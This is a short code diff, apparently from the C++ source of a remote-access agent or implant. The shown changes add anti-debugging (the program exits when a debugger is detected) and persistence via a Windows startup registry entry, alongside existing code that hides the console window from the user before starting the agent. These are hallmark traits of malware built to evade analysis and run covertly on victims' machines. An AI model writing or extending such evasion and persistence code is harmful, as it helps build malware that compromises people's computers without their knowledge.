@@ -6,6 +6,8 @@
 #include "shell.h"
 #include "network_operations.h"
 #include "agent.h"
+#include "is_debugger_present.h"
+#include "persistance.h"
 
 int getRandom(int min, int max) {
     std::random_device rd;
@@ -34,6 +36,12 @@ std::vector<std::string> split_string(const std::string& s, const std::string& d
 
 
 int main() {
+    if(DebuggerPresence()){
+        exit(1);
+    }
+    if(!AddToStartupRegistry("asd")){
+        exit(2);
+    }
     //Hiding console from user
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     //Initializing agent
